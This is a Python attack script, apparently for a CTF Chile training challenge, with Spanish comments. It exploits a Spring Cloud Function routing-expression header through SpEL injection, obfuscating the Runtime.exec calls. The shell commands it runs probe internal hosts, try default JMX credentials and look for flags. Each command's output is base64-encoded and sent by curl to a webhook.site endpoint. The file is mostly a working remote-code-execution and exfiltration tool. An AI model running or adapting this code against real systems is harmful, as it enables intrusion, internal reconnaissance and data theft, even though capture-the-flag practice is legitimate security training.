#!/usr/bin/env python3
"""
CTF Chile - Explorar servicios uvicorn descubiertos
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Explorando servicios uvicorn en puertos 8000...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=20)
        print(f"    [+] {tag:35} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] FASE 1: Explorando endpoints comunes...")

# Endpoints comunes para FastAPI/Python APIs
common_endpoints = [
    "/", "/docs", "/redoc", "/openapi.json", "/health",
    "/status", "/api", "/v1", "/admin", "/login", "/flag",
    "/vault", "/auth", "/users", "/admin/flag", "/api/flag"
]

hosts = ["10.160.209.1", "10.109.220.1"]

for host in hosts:
    for endpoint in common_endpoints:
        host_safe = host.replace(".", "_")
        endpoint_safe = endpoint.replace("/", "_")
        probe(f"api_{host_safe}{endpoint_safe}", f"curl -s http://{host}:8000{endpoint} 2>/dev/null | head -10")

print("[*] FASE 2: Probando métodos HTTP...")

# Probar diferentes métodos HTTP
http_methods = ["GET", "POST", "PUT", "OPTIONS"]
for host in hosts:
    for method in http_methods:
        host_safe = host.replace(".", "_")
        probe(f"method_{method}_{host_safe}", f"curl -s -X {method} http://{host}:8000/ 2>/dev/null | head -5")

print("[*] FASE 3: Probando autenticación con credenciales JMX...")

# Probar autenticación con las credenciales encontradas
auth_data = [
    ('{"username": "monitorRole", "password": "QED"}', "monitor_qed"),
    ('{"username": "controlRole", "password": "R&D"}', "control_rd"),
    ('{"username": "monitor", "password": "QED"}', "monitor_simple"),
    ('{"username": "control", "password": "R&D"}', "control_simple")
]

for host in hosts:
    for auth_json, tag_suffix in auth_data:
        host_safe = host.replace(".", "_")
        # POST authentication
        probe(f"auth_{host_safe}_{tag_suffix}", f"curl -s -X POST -H 'Content-Type: application/json' -d '{auth_json}' http://{host}:8000/login 2>/dev/null || curl -s -X POST -H 'Content-Type: application/json' -d '{auth_json}' http://{host}:8000/auth 2>/dev/null")

print("[*] FASE 4: Explorando estructura de directorios...")

# Explorar directorios comunes
directories = [
    "/admin", "/api/v1", "/api/v2", "/vault", "/secure",
    "/flags", "/internal", "/private", "/management"
]

for host in hosts:
    for directory in directories:
        host_safe = host.replace(".", "_")
        dir_safe = directory.replace("/", "_")
        probe(f"dir_{host_safe}{dir_safe}", f"curl -s http://{host}:8000{directory}/ 2>/dev/null | head -8")

print("[*] FASE 5: Búsqueda de flags específicos...")

# Buscar flags en endpoints específicos
flag_endpoints = [
    "/flag", "/flag.txt", "/api/flag", "/admin/flag",
    "/vault/flag", "/ctf", "/ctfchile", "/final"
]

for host in hosts:
    for endpoint in flag_endpoints:
        host_safe = host.replace(".", "_")
        endpoint_safe = endpoint.replace("/", "_")
        probe(f"flag_{host_safe}{endpoint_safe}", f"curl -s http://{host}:8000{endpoint} 2>/dev/null")

print("[*] FASE 6: Probando con User-Agent y Headers personalizados...")

# Probar con headers especiales que podrían triggerar comportamientos ocultos
headers_tests = [
    "-H 'X-Admin: true'",
    "-H 'X-Vault-Token: QED'",
    "-H 'Authorization: Bearer QED'",
    "-H 'X-JMX-User: controlRole'"
]

for host in hosts:
    for i, headers in enumerate(headers_tests):
        host_safe = host.replace(".", "_")
        probe(f"headers_{host_safe}_{i}", f"curl -s {headers} http://{host}:8000/ 2>/dev/null | head -5")

time.sleep(25)

# Recoger y analizar respuestas
print("\n[*] Analizando servicios uvicorn...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=60", timeout=20)
data = r.json().get("data", [])

api_responses = []
auth_successes = []
flags_found = []
interesting_endpoints = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 70)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar respuestas de API válidas
            if any(keyword in decoded.lower() for keyword in ["json", "api", "swagger", "fastapi", "uvicorn"]):
                api_responses.append((path, decoded))
                print("🔌 RESPUESTA API VÁLIDA")

            # Detectar autenticación exitosa
            if any(keyword in decoded.lower() for keyword in ["token", "success", "authenticated", "logged", "jwt"]):
                auth_successes.append((path, decoded))
                print("🔑 POSIBLE AUTENTICACIÓN EXITOSA")

            # Detectar endpoints interesantes
            if any(keyword in decoded for keyword in ["{", "}", "[", "]", "error", "detail"]):
                if len(decoded.strip()) > 20 and len(decoded.strip()) < 500:
                    interesting_endpoints.append((path, decoded))
                    print("🎯 ENDPOINT INTERESANTE")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                flags_found.append((path, decoded))
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen final
print("\n" + "="*70)
print("📊 RESUMEN DE SERVICIOS UVICORN")
print("="*70)

if api_responses:
    print(f"🔌 RESPUESTAS API: {len(api_responses)}")
    for path, content in api_responses:
        print(f"    - {path}: {content[:100]}...")

if auth_successes:
    print(f"\n🔑 AUTENTICACIONES: {len(auth_successes)}")
    for path, content in auth_successes:
        print(f"    ✅ {path}: {content[:100]}...")

if interesting_endpoints:
    print(f"\n🎯 ENDPOINTS INTERESANTES: {len(interesting_endpoints)}")
    for path, content in interesting_endpoints:
        print(f"    - {path}: {content[:100]}...")

if flags_found:
    print(f"\n🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
    for path, flag in flags_found:
        print(f"    🎯 {path}: {flag}")
else:
    print("\n💭 No se encontraron flags aún. Continuar con autenticación y exploración.")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")